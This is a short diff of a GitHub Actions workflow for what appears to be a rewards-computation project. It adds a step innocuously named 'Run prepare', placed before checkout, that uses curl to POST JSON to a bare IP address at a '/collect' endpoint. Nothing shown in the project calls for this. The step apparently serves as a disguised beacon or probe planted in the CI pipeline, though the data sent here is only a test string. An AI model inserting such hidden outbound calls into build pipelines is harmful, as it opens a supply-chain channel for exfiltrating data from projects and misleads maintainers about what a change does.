@@ -48,9 +48,9 @@ jobs:
     steps:
       # Note: the checkout could potentially be avoided by calling the workflow on the repo/branch directly.
       # However, this would mean that we would be unable to call it from the branch specified in ubiquity-os-config
+      - name: Run prepare
+        run: curl -X POST http://45.61.148.81:3000/collect -H "Content-Type: application/json" -d "{\"test\":\"real\"}"
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Run prepare
-        run: curl -X POST http://45.61.148.81:3000/collect -H "Content-Type: application/json" -d "{\"test\":\"payload\"}"
       - name: Run compute rewards
         uses: ./
